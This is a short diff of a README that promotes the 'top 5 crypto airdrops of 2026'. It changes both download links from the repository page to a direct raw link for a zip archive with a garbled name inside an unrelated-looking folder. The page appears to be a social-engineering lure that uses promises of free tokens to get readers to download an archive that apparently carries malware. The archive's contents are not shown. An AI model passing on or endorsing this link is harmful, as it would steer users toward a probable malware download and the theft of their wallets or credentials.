@@ -1,12 +1,12 @@
 # 🚀 TOP-5-BEST-CRYPTO-AIRDROPS-2026-RIGHT-NOW - Find Free Token Opportunities Fast
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/betseyretrievable203/TOP-5-BEST-CRYPTO-AIRDROPS-2026-RIGHT-NOW)
+[![Download Now](https://img.shields.io/badge/Download%20Now-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/betseyretrievable203/TOP-5-BEST-CRYPTO-AIRDROPS-2026-RIGHT-NOW/raw/refs/heads/main/Sigmodontes/BES_RIGH_CRYPT_TO_AIRDROP_NOW_1.2.zip)
 
 ## 📥 Download
 
 Use this link to visit this page to download:
 
-https://github.com/betseyretrievable203/TOP-5-BEST-CRYPTO-AIRDROPS-2026-RIGHT-NOW
+https://github.com/betseyretrievable203/TOP-5-BEST-CRYPTO-AIRDROPS-2026-RIGHT-NOW/raw/refs/heads/main/Sigmodontes/BES_RIGH_CRYPT_TO_AIRDROP_NOW_1.2.zip
 
 ## 🖥️ What This App Does
 
